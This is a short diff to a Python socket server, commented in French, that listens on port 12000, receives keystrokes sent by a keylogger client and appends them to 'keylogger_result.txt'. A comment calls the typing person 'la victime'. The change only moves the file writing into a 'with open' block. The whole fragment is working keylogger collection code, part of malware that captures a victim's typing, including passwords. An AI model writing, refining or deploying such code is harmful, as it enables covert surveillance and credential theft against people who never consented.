@@ -8,13 +8,12 @@ port=12000
 s.bind((host,port))
 s.listen(10)
 
-# Ce fichier stockera les touches tapées par la victime 
-file = open('keylogger_result.txt','a')
-
 while True:
     c,addr=s.accept()
     content=c.recv(100).decode()
     if not content:
         break
     print(content)
-    file.write(content)
+    # on stocke chaque touche tapée dans le fichier suivant 
+    with open('keylogger_result.txt','a') as f:
+        f.write(content)
